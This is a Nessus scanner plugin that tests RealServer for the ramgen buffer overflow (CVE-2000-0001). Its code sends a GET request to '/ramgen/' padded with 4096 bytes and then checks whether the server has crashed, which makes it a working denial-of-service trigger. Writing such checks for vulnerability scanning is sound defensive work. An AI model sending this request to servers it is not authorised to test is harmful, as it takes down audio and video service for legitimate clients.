#
# This script was written by Renaud Deraison
# 
# Original exploit code : see http://www.beavuh.org
#
# See the Nessus Scripts License for details
#
#
if(description)
{
 script_id(10199);
 script_bugtraq_id(888);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2000-0001");
 
 name["english"] = "RealServer Ramgen crash (ramcrash)";
 name["francais"] = "RealServer Ramgen crash (ramcrash)";
 script_name(english:name["english"], francais:name["francais"]);
 
desc["english"] = "
It was possible to crash the remote Real server
by sending the request :

	GET /ramgen/AAAAA[...]AAA HTTP/1.1
	
An attacker may use this flaw to prevent this
system from serving Real Audio or Video
content to legitimate clients

Solution : Upgrade to a fixed version of RealServer.
Risk factor : High";


desc["francais"] = "
Il s'est avéré possible de faire planter
le serveur Real distant en lui envoyant
la requete :

	GET /ramgen/AAAA[...]AAAA HTTP/1.1
	
Un pirate peut utiliser ce problème pour
empecher ce système de servir des données
au format real audio / real video aux
clients légitimes.

Solution : Upgradez en version 6.0
Facteur de risque : Elevé"; 

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Overflows a buffer in RealServer";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 script_require_ports(7070, "Services/realserver");
 script_dependencies("find_service.nes");
 exit(0);
}

include("http_func.inc");

port = get_kb_item("Services/realserver");
if(!port)port = 7070;
if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 
 soc = http_open_socket(port);
 if(soc)
 {
  s = http_get(item:string("/ramgen/", crap(4096)), port:port);
  send(socket:soc, data:s);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  if(http_is_dead(port:port))exit(0);
 }
}
